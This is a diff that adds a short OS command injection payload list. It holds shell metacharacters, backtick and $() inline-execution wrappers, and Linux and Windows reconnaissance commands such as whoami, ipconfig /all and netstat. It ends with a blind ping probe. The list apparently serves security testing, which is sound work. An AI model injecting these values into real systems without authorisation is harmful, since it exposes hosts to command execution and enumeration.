@@ -1,0 +1,32 @@
+# ----- Metacharacters for windows and linux
+&
+&&
+|
+||
+
+# ----- Metacharacters for linux
+\n
+0x0a
+;
+
+# ----- Inject inline execution
+`<injected_command>`
+$(<injected_command>)
+
+# ----- Linux command:
+whoami
+uname -a
+ifconfig
+ps -ef
+
+# ----- Windows command
+ver
+ipconfig /all
+tasklist
+
+# ----- Command for windows and linux
+&
+netstat -an
+
+# ----- Blind detection
+& ping -c 10 127.0.0.1 &
